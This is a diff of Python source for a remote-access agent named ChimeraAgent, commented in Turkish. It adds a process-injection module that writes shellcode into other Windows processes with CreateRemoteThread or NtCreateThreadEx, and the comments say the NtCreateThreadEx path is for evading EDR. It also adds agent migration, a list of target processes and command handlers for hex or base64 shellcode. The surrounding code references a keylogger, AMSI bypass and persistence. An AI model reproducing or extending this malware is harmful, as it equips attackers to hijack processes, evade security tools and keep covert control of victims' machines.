@@ -28,6 +28,383 @@ MAX_RECONNECT = -1        # -1 = sınırsız yeniden bağlanma denemesi
 
 
 
+class ProcessInjector:
+    """
+    Windows ctypes tabanlı Process Injection modülü.
+    Shellcode veya DLL'i hedef process'in sanal belleğine enjekte eder.
+    Desteklenen teknikler:
+      - Classic Injection : VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
+      - NtCreateThreadEx  : EDR atlatma amaçlı düşük seviye thread oluşturma
+    """
+
+    # Windows sabitleri
+    _PROCESS_ALL_ACCESS = 0x1F0FFF
+    _MEM_COMMIT         = 0x1000
+    _MEM_RESERVE        = 0x2000
+    _PAGE_EXECUTE_READWRITE = 0x40
+    _MEM_RELEASE        = 0x8000
+
+    def _open_process(self, pid: int):
+        """Hedef process'i PROCESS_ALL_ACCESS ile açar.
+
+        Returns:
+            HANDLE veya None (hata durumunda)
+        """
+        if sys.platform != "win32":
+            return None
+        try:
+            import ctypes
+            kernel32 = ctypes.windll.kernel32
+            handle = kernel32.OpenProcess(
+                self._PROCESS_ALL_ACCESS,
+                False,
+                pid
+            )
+            return handle if handle else None
+        except Exception:
+            return None
+
+    def _close_handle(self, handle):
+        """Windows HANDLE'ı kapatır."""
+        try:
+            import ctypes
+            ctypes.windll.kernel32.CloseHandle(handle)
+        except Exception:
+            pass
+
+    def _alloc_and_write(self, kernel32, h_process, shellcode: bytes):
+        """Hedef process'e bellek tahsis eder ve shellcode'u yazar.
+
+        Returns:
+            (remote_addr, shellcode_len) veya (None, 0)
+        """
+        import ctypes
+
+        sc_len = len(shellcode)
+
+        # Uzak process'te RWX bellek tahsis et
+        remote_addr = kernel32.VirtualAllocEx(
+            h_process,
+            None,
+            sc_len,
+            self._MEM_COMMIT | self._MEM_RESERVE,
+            self._PAGE_EXECUTE_READWRITE
+        )
+        if not remote_addr:
+            return None, 0
+
+        # Shellcode'u belleğe yaz
+        written = ctypes.c_size_t(0)
+        sc_buf = (ctypes.c_char * sc_len)(*shellcode)
+        ok = kernel32.WriteProcessMemory(
+            h_process,
+            ctypes.c_void_p(remote_addr),
+            sc_buf,
+            sc_len,
+            ctypes.byref(written)
+        )
+        if not ok or written.value != sc_len:
+            kernel32.VirtualFreeEx(h_process, ctypes.c_void_p(remote_addr), 0, self._MEM_RELEASE)
+            return None, 0
+
+        return remote_addr, sc_len
+
+    def inject_shellcode(self, pid: int, shellcode: bytes, use_nt: bool = False) -> str:
+        """Shellcode'u hedef process'e enjekte eder ve çalıştırır.
+
+        Args:
+            pid      : Hedef process ID.
+            shellcode: Ham bayt dizisi (x64 veya x86 shellcode).
+            use_nt   : True ise NtCreateThreadEx kullanır (EDR atlatma).
+
+        Returns:
+            str: İşlem sonucu.
+        """
+        if sys.platform != "win32":
+            return "[!] Process Injection sadece Windows sistemlerde desteklenmektedir."
+
+        if not shellcode:
+            return "[!] Shellcode boş olamaz."
+
+        try:
+            import ctypes
+            from ctypes import wintypes
+
+            kernel32 = ctypes.windll.kernel32
+
+            # Hedef process'i aç
+            h_process = self._open_process(pid)
+            if not h_process:
+                err = kernel32.GetLastError()
+                return f"[!] Process açılamadı (PID: {pid}). Hata kodu: {err}. Yeterli yetkiniz var mı?"
+
+            try:
+                remote_addr, sc_len = self._alloc_and_write(kernel32, h_process, shellcode)
+                if not remote_addr:
+                    err = kernel32.GetLastError()
+                    return f"[!] Bellek tahsisi/yazma başarısız (PID: {pid}). Hata kodu: {err}"
+
+                if use_nt:
+                    # NtCreateThreadEx yöntemi - daha düşük seviye, bazı hook'ları atlatır
+                    result = self._nt_create_thread(h_process, remote_addr)
+                else:
+                    # Klasik yöntem: CreateRemoteThread
+                    result = self._create_remote_thread(kernel32, h_process, remote_addr)
+
+                return result
+
+            finally:
+                self._close_handle(h_process)
+
+        except Exception as e:
+            return f"[!] Injection hatası: {str(e)}"
+
+    def _create_remote_thread(self, kernel32, h_process, remote_addr) -> str:
+        """Klasik CreateRemoteThread yöntemi ile uzak thread oluşturur."""
+        import ctypes
+
+        h_thread = kernel32.CreateRemoteThread(
+            h_process,
+            None,
+            0,
+            ctypes.c_void_p(remote_addr),
+            None,
+            0,
+            None
+        )
+        if not h_thread:
+            err = kernel32.GetLastError()
+            return f"[!] CreateRemoteThread başarısız. Hata kodu: {err}"
+
+        # Thread'in başlamasını kısa süre bekle
+        kernel32.WaitForSingleObject(h_thread, 500)
+        self._close_handle(h_thread)
+        return f"[+] Shellcode enjekte edildi ve çalıştırıldı (CreateRemoteThread). Adres: {hex(remote_addr)}"
+
+    def _nt_create_thread(self, h_process, remote_addr) -> str:
+        """NtCreateThreadEx yöntemi ile uzak thread oluşturur (EDR atlatma)."""
+        import ctypes
+
+        try:
+            ntdll = ctypes.windll.ntdll
+
+            # NtCreateThreadEx prototype
+            # NTSTATUS NtCreateThreadEx(
+            #   PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
+            #   PVOID ObjectAttributes, HANDLE ProcessHandle,
+            #   PVOID StartRoutine, PVOID Argument,
+            #   ULONG CreateFlags, SIZE_T ZeroBits,
+            #   SIZE_T StackSize, SIZE_T MaximumStackSize,
+            #   PVOID AttributeList)
+            ntdll.NtCreateThreadEx.restype  = ctypes.c_ulong  # NTSTATUS
+            ntdll.NtCreateThreadEx.argtypes = [
+                ctypes.POINTER(ctypes.c_void_p),  # ThreadHandle (out)
+                ctypes.c_ulong,                    # DesiredAccess
+                ctypes.c_void_p,                   # ObjectAttributes
+                ctypes.c_void_p,                   # ProcessHandle
+                ctypes.c_void_p,                   # StartRoutine
+                ctypes.c_void_p,                   # Argument
+                ctypes.c_ulong,                    # CreateFlags
+                ctypes.c_size_t,                   # ZeroBits
+                ctypes.c_size_t,                   # StackSize
+                ctypes.c_size_t,                   # MaximumStackSize
+                ctypes.c_void_p,                   # AttributeList
+            ]
+
+            h_thread = ctypes.c_void_p(0)
+            status = ntdll.NtCreateThreadEx(
+                ctypes.byref(h_thread),
+                0x1FFFFF,                 # THREAD_ALL_ACCESS
+                None,
+                ctypes.c_void_p(h_process),
+                ctypes.c_void_p(remote_addr),
+                None,
+                0,                        # CREATE_SUSPENDED yoksa 0
+                0,
+                0,
+                0,
+                None
+            )
+
+            if status != 0:
+                return f"[!] NtCreateThreadEx başarısız. NTSTATUS: {hex(status)}"
+
+            if h_thread.value:
+                ctypes.windll.kernel32.WaitForSingleObject(h_thread, 500)
+                self._close_handle(h_thread)
+
+            return f"[+] Shellcode enjekte edildi ve çalıştırıldı (NtCreateThreadEx). Adres: {hex(remote_addr)}"
+
+        except AttributeError:
+            return "[!] NtCreateThreadEx bu sistemde kullanılamıyor, CreateRemoteThread kullanın."
+        except Exception as e:
+            return f"[!] NtCreateThreadEx hatası: {str(e)}"
+
+    def migrate(self, target_pid: int, current_shellcode_path: str = None) -> str:
+        """Mevcut agent'ı başka bir process'e migrate eder.
+
+        Mevcut agent'ı (kendini) hedef process'e taşır:
+        1. Mevcut process belleğindeki agent kodunu alır.
+        2. Hedef process'e basit bir loader shellcode enjekte eder.
+
+        NOT: Bu fonksiyon pratik bir yardımcıdır. Gerçek migration
+        için shellcode, agent payload'ının derlenmiş halini içermelidir.
+        Bu implementasyonda hedef process'e bildirim yapılır ve
+        seçenekler önerilir (gerçek shellcode handler tarafından sağlanmalıdır).
+
+        Args:
+            target_pid           : Hedef process PID.
+            current_shellcode_path: Enjekte edilecek shellcode dosyası yolu (opsiyonel).
+
+        Returns:
+            str: İşlem sonucu.
+        """
+        if sys.platform != "win32":
+            return "[!] Process Migration sadece Windows sistemlerde desteklenmektedir."
+
+        try:
+            import ctypes
+
+            kernel32 = ctypes.windll.kernel32
+
+            # Hedef process'in var olup olmadığını kontrol et
+            h_process = self._open_process(target_pid)
+            if not h_process:
+                err = kernel32.GetLastError()
+                return (
+                    f"[!] Hedef process açılamadı (PID: {target_pid}). "
+                    f"Hata kodu: {err}. Process çalışıyor mu ve yetkiniz var mı?"
+                )
+            self._close_handle(h_process)
+
+            # Shellcode dosyası verilmişse enjekte et
+            if current_shellcode_path:
+                if not os.path.exists(current_shellcode_path):
+                    return f"[!] Shellcode dosyası bulunamadı: {current_shellcode_path}"
+
+                with open(current_shellcode_path, "rb") as f:
+                    shellcode = f.read()
+
+                result = self.inject_shellcode(target_pid, shellcode)
+                if "[+]" in result:
+                    return (
+                        f"[+] Migration tamamlandı! Agent, PID {target_pid} içine taşındı.\n"
+                        f"    Detay: {result}\n"
+                        f"    Mevcut process (PID: {os.getpid()}) sonlandırılabilir."
+                    )
+                return f"[!] Migration başarısız: {result}"
+
+            # Shellcode yoksa bilgi ver
+            current_pid  = os.getpid()
+            current_arch = "x64" if struct.calcsize("P") * 8 == 64 else "x86"
+
+            info_lines = [
+                f"[*] Process Migration Hazır",
+                f"    Mevcut Agent PID : {current_pid}",
+                f"    Hedef PID        : {target_pid}",
+                f"    Mimari           : {current_arch}",
+                f"    Durum            : Hedef process erişilebilir.",
+                "",
+                f"[*] Kullanım:",
+                f"    inject_shellcode <PID> <HEX_SHELLCODE>   -- Shellcode enjekte et",
+                f"    inject_migrate   <PID> <SHELLCODE_HEX>   -- Shellcode ile migrate et",
+            ]
+            return "\n".join(info_lines)
+
+        except Exception as e:
+            return f"[!] Migration hatası: {str(e)}"
+
+    def list_injectable_processes(self) -> str:
+        """Enjeksiyona uygun process'leri listeler.
+
+        Düşük yetkili, inject için uygun process'leri filtreler.
+
+        Returns:
+            str: Formatlanmış process listesi.
+        """
+        if sys.platform != "win32":
+            return "[!] Bu komut sadece Windows sistemlerde desteklenmektedir."
+
+        try:
+            import ctypes
+            from ctypes import wintypes
+
+            kernel32 = ctypes.windll.kernel32
+
+            # CreateToolhelp32Snapshot ile process listesi al
+            TH32CS_SNAPPROCESS = 0x00000002
+
+            class PROCESSENTRY32(ctypes.Structure):
+                _fields_ = [
+                    ("dwSize",              wintypes.DWORD),
+                    ("cntUsage",            wintypes.DWORD),
+                    ("th32ProcessID",       wintypes.DWORD),
+                    ("th32DefaultHeapID",   ctypes.POINTER(ctypes.c_ulong)),
+                    ("th32ModuleID",        wintypes.DWORD),
+                    ("cntThreads",          wintypes.DWORD),
+                    ("th32ParentProcessID", wintypes.DWORD),
+                    ("pcPriClassBase",      ctypes.c_long),
+                    ("dwFlags",             wintypes.DWORD),
+                    ("szExeFile",           ctypes.c_char * 260),
+                ]
+
+            h_snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+            if h_snap == ctypes.c_void_p(-1).value:
+                return "[!] Process snapshot alınamadı."
+
+            try:
+                pe32 = PROCESSENTRY32()
+                pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
+
+                # Güvenli (enjeksiyona uygun) process'leri filtrele
+                safe_processes = [
+                    "explorer.exe", "notepad.exe", "mspaint.exe",
+                    "calc.exe",     "wordpad.exe",  "msiexec.exe",
+                    "svchost.exe",  "rundll32.exe", "dllhost.exe",
+                    "conhost.exe",  "taskhost.exe", "taskhostw.exe",
+                ]
+
+                injectable = []
+                current_pid = os.getpid()
+
+                if kernel32.Process32First(h_snap, ctypes.byref(pe32)):
+                    while True:
+                        exe_name = pe32.szExeFile.decode("cp1254", errors="ignore").lower()
+                        pid      = pe32.th32ProcessID
+
+                        if pid != current_pid and exe_name in safe_processes:
+                            # Handle açarak erişim kontrolü yap
+                            h_test = kernel32.OpenProcess(0x400, False, pid)  # PROCESS_QUERY_INFORMATION
+                            if h_test:
+                                self._close_handle(h_test)
+                                injectable.append((pid, exe_name, pe32.cntThreads))
+
+                        if not kernel32.Process32Next(h_snap, ctypes.byref(pe32)):
+                            break
+
+            finally:
+                self._close_handle(h_snap)
+
+            if not injectable:
+                return "[-] Enjeksiyona uygun erişilebilir process bulunamadı."
+
+            lines = [
+                "=" * 55,
+                "  ENJEKSİYONA UYGUN PROCESS'LER",
+                "=" * 55,
+                f"  {'PID':<8} {'İSİM':<25} {'THREAD'}" ,
+                f"  {'-'*7} {'-'*24} {'-'*6}",
+            ]
+            for pid, name, threads in injectable:
+                lines.append(f"  {pid:<8} {name:<25} {threads}")
+            lines.append("=" * 55)
+            lines.append(f"  Toplam: {len(injectable)} process")
+            return "\n".join(lines)
+
+        except Exception as e:
+            return f"[!] Process listeleme hatası: {str(e)}"
+
+
 class Keylogger:
     """
     Windows için Ctypes tabanlı Keylogger.
@@ -371,8 +748,9 @@ class ChimeraAgent:
         self.sock = None
         self.running = True
         self.loaded_modules = {}  # Yüklü modülleri saklar: {name: module_obj}
-        self.keylogger = Keylogger() # Keylogger modülü
-        self.clipboard = ClipboardManager() # Clipboard modülü
+        self.keylogger  = Keylogger()          # Keylogger modülü
+        self.clipboard  = ClipboardManager()    # Clipboard modülü
+        self.injector   = ProcessInjector()     # Process Injection modülü
 
     # --------------------------------------------------------
     # Bağlantı Yönetimi
@@ -1610,13 +1988,106 @@ class ChimeraAgent:
             
         if cmd_lower == "amsi_bypass":
             return self.bypass_amsi()
-            
+
         # Persistence (Kalıcılık) Komutları
         if cmd_lower == "persistence_install":
             return self.install_persistence()
-            
+
         if cmd_lower == "persistence_remove":
             return self.remove_persistence()
+
+        # ── Process Injection / Migration (Faz 5.3) ──────────────────────
+
+        # inject_list: Enjeksiyona uygun process'leri göster
+        if cmd_lower == "inject_list":
+            return self.injector.list_injectable_processes()
+
+        # inject_shellcode <PID> <HEX_SHELLCODE>
+        #   Shellcode'u hex string olarak alır ve hedef PID'e enjekte eder.
+        #   Örnek: inject_shellcode 1234 fc4883e4f0...
+        if cmd_lower.startswith("inject_shellcode "):
+            try:
+                parts = cmd.strip().split(None, 2)
+                if len(parts) < 3:
+                    return "[!] Kullanım: inject_shellcode <PID> <HEX_SHELLCODE>"
+
+                target_pid = int(parts[1])
+                hex_sc     = parts[2].strip()
+
+                # Hex string'i bytes'a çevir (boşluk/\x prefix toleranslı)
+                hex_sc_clean = hex_sc.replace(" ", "").replace("\\x", "").replace("0x", "")
+                shellcode = bytes.fromhex(hex_sc_clean)
+
+                # NtCreateThreadEx kullanılsın mı? (prefix: nt:)
+                use_nt = False
+                if parts[2].strip().startswith("nt:"):
+                    use_nt = True
+                    hex_sc_clean = parts[2][3:].strip().replace(" ", "").replace("\\x", "").replace("0x", "")
+                    shellcode = bytes.fromhex(hex_sc_clean)
+
+                return self.injector.inject_shellcode(target_pid, shellcode, use_nt=use_nt)
+
+            except ValueError as e:
+                return f"[!] Geçersiz PID veya shellcode formatı: {str(e)}"
+            except Exception as e:
+                return f"[!] inject_shellcode hatası: {str(e)}"
+
+        # inject_shellcode_b64 <PID> <B64_SHELLCODE>
+        #   Base64 encoded shellcode ile enjeksiyon (handler tarafından kullanılır).
+        if cmd_lower.startswith("inject_shellcode_b64 "):
+            try:
+                parts = cmd.strip().split(None, 2)
+                if len(parts) < 3:
+                    return "[!] Kullanım: inject_shellcode_b64 <PID> <BASE64_SHELLCODE>"
+
+                target_pid = int(parts[1])
+                use_nt     = False
+                b64_raw    = parts[2].strip()
+
+                if b64_raw.startswith("nt:"):
+                    use_nt  = True
+                    b64_raw = b64_raw[3:]
+
+                shellcode = base64.b64decode(b64_raw)
+                return self.injector.inject_shellcode(target_pid, shellcode, use_nt=use_nt)
+
+            except Exception as e:
+                return f"[!] inject_shellcode_b64 hatası: {str(e)}"
+
+        # inject_migrate <PID>  &  inject_migrate <PID> <B64_SHELLCODE>
+        #   Migration: varsa shellcode ile, yoksa bilgi verir.
+        if cmd_lower.startswith("inject_migrate"):
+            try:
+                parts = cmd.strip().split(None, 2)
+                if len(parts) < 2:
+                    return "[!] Kullanım: inject_migrate <PID> [B64_SHELLCODE]"
+
+                target_pid = int(parts[1])
+
+                if len(parts) == 3:
+                    # B64 shellcode verildi → geçici dosyaya yaz, migrate et, sil
+                    shellcode = base64.b64decode(parts[2].strip())
+                    tmp_sc_path = os.path.join(
+                        __import__("tempfile").gettempdir(),
+                        f".mig_{os.getpid()}_{target_pid}.bin"
+                    )
+                    try:
+                        with open(tmp_sc_path, "wb") as _f:
+                            _f.write(shellcode)
+                        result = self.injector.migrate(target_pid, tmp_sc_path)
+                    finally:
+                        try:
+                            os.remove(tmp_sc_path)
+                        except Exception:
+                            pass
+                    return result
+                else:
+                    return self.injector.migrate(target_pid)
+
+            except ValueError as e:
+                return f"[!] Geçersiz PID: {str(e)}"
+            except Exception as e:
+                return f"[!] inject_migrate hatası: {str(e)}"
 
         if cmd_lower.startswith("clipboard_set "):
             try:
